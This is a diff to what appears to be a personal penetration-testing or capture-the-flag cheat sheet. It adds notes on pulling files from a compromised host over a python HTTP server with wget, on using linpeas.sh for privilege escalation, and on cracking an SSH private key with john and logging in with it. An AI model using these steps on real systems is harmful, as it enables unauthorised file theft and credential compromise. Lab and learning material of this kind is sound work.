@@ -3,7 +3,7 @@
 -------------------------------------------------------------------------------------------
 
 `verison` 
-`1.1`
+`1.1.2`
 
 -------------------------------------------------------------------------------------------
 
@@ -63,15 +63,23 @@
 
 `In Reverese shell`
 
-	python3 -m http.server
+	python3 -m http.server {port}
 
 `In local Machine`
 
 	wget machineip:8000/file.name
 
+
 `for directory` `sometimes`
 
 	wget --recursive --no-parent  10.10.46.113:8000/{directory}
+
+------------------------------------------------------------------------------------------------------
+
+`linpeas.sh`
+
+	linpeas.sh is the best script for previlage escilation
+
 
 -------------------------------------------------------------------------------------------------------
 
@@ -116,6 +124,14 @@
 
 `then`
        john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john
+
+`ssh2johnhash`
+
+	chmod 666 id_rsa #change mode to initial RSA private key file
+
+`for ssh connection`
+
+	ssh -i id_rsa user@ip 
 
 
 ------------------------------------------------------------------------------------------------------
